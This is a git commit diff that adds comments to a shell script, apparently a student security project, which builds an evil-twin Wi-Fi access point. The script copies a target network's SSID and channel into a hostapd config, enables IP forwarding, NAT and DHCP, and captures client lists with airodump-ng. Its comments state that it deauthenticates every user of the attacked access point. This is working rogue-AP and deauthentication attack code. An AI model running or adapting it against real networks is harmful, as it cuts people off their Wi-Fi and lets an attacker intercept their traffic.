61e85e8318c833b5f9dc76328e4097e04facdbe4
Goenae <aozorra.bluesky02@gmail.com>
2022-10-06 09:21:35 +0200

    Add comments

--- airscript.sh
+++ airscript.sh
@@ -52,11 +52,12 @@ sed -i "5s/.*/ssid="$finalName"/" hostconf.conf
 
 number=1
 
+#Turn system on forwarding mode
 sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
 cat /proc/sys/net/ipv4/ip_forward
 echo "Echo 1 OK"
 
-#Setup internet route for user
+#Setup internet route for user, configure firewall
 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 echo "iptables OK"
 
@@ -64,11 +65,13 @@ echo "iptables OK"
 sudo ip addr add 192.168.1.1/24 dev $interface
 echo "ip add OK"
 
+#Exec hostapd on another terminal
 sudo gnome-terminal -- bash -c "sudo hostapd /home/mike/Documents/Secu/hostconf.conf ; exec bash"
 
 sudo rm scan-01.kismet.csv
-sudo rm scan-01.log
+sudo rm scan-01.log.csv
 
+#Exec dnsmasq on another terminal to setup DHCP
 sudo gnome-terminal -- bash -c "sudo dnsmasq -d -C host.conf ; exec bash"
 
 #Deauth all users of the selected AP until the end of the script
@@ -77,14 +80,17 @@ sudo airmon-ng start $interface
 
 sudo timeout -s 2 80 airodump-ng $monitor_interface --bssid $finalMAC -a -w device & sleep 81
 
+#Delete line 1 to 5 (useless lines, without data wanted)
 sed -i '1,5d' device-01.csv
 
+#Automatically change the channel of the fake AP to match with the original
 sed -i "7s/.*/channel="$finalChannel"/" hostconf.conf
 
 sudo airmon-ng stop $interface
 
 sudo airmon-ng start $interface
 
+#Death each user of the AP attacked
 while IFS= read -r line
 do
   #Parse the given line and put every datas in an array
@@ -94,4 +100,3 @@ do
 
 
 done < "device-01.csv"
-
